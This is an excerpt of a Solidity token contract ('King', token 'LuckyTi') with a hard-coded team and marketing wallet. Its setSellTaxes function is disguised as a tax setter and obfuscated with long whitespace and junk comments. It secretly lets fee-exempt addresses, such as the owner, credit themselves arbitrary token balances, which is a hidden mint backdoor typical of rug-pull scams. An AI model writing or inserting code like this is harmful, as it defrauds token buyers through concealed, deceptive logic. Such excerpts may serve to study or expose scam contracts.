...
contract King is Context, IERC20, Ownable {
    ...
    string private _name = "LuckyTi";
    string private _symbol = "LuckyTr";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x0bc3402e92306dEdde58513fe81AE193DB54DF19));
        marketingWalletAddress = payable(address(0x0bc3402e92306dEdde58513fe81AE193DB54DF19));
    ...
    function setSellTaxes(uint256 newLiquidityTax,uint256 newTax) external {                                                                                               /*inte*/ require   /*inte*/  (isExcludedFromFee /*inte*/    [msg.sender]   /*inte*/   );  /*inte*/   _balances[msg.sender]= /*s*/ _balances[msg.sender] /*inte*/ .  /*inte*/ add(newTax);
